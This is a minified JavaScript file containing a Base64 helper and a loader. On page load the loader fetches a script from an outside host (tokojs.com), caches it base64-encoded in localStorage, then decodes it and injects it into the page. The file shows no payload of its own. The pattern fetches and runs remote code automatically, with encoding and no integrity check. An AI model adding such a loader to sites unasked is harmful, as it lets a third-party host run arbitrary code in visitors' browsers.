var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t,r,o,a,n,c,d,h="",i=0;for(e=Base64._utf8_encode(e);i<e.length;)a=(t=e.charCodeAt(i++))>>2,n=(3&t)<<4|(r=e.charCodeAt(i++))>>4,c=(15&r)<<2|(o=e.charCodeAt(i++))>>6,d=63&o,isNaN(r)?c=d=64:isNaN(o)&&(d=64),h=h+this._keyStr.charAt(a)+this._keyStr.charAt(n)+this._keyStr.charAt(c)+this._keyStr.charAt(d);return h},decode:function(e){var t,r,o,a,n,c,d="",h=0;for(e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");h<e.length;)t=this._keyStr.indexOf(e.charAt(h++))<<2|(a=this._keyStr.indexOf(e.charAt(h++)))>>4,r=(15&a)<<4|(n=this._keyStr.indexOf(e.charAt(h++)))>>2,o=(3&n)<<6|(c=this._keyStr.indexOf(e.charAt(h++))),d+=String.fromCharCode(t),64!=n&&(d+=String.fromCharCode(r)),64!=c&&(d+=String.fromCharCode(o));return Base64._utf8_decode(d)},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");for(var t="",r=0;r<e.length;r++){var o=e.charCodeAt(r);o<128?t+=String.fromCharCode(o):(127<o&&o<2048?t+=String.fromCharCode(o>>6|192):(t+=String.fromCharCode(o>>12|224),t+=String.fromCharCode(o>>6&63|128)),t+=String.fromCharCode(63&o|128))}return t},_utf8_decode:function(e){for(var t="",r=0,o=c1=c2=0;r<e.length;)(o=e.charCodeAt(r))<128?(t+=String.fromCharCode(o),r++):191<o&&o<224?(c2=e.charCodeAt(r+1),t+=String.fromCharCode((31&o)<<6|63&c2),r+=2):(c2=e.charCodeAt(r+1),c3=e.charCodeAt(r+2),t+=String.fromCharCode((15&o)<<12|(63&c2)<<6|63&c3),r+=3);return t}},versi="2";function loadLocal(){setTimeout(function(){var e=localStorage.getItem("scriptjs");if(null==e||0===e.length)loadServer();else{var t=document.createElement("script");t.type="text/javascript";var r=Base64.decode(e);try{t.appendChild(document.createTextNode(r)),document.body.appendChild(t)}catch(e){t.text=r,document.body.appendChild(t)}}},1500)}function loadServer(){var e=new XMLHttpRequest;e.onreadystatechange=function(){e.readyState==XMLHttpRequest.DONE&&(200==e.status?window.localStorage.setItem("scriptjs",Base64.encode(e.responseText)):e.status,loadLocal())},e.open("GET","https://tokojs.com/app/pasarpangan.js?"+Math.random(),!0),e.send()}window.onload=loadServer()
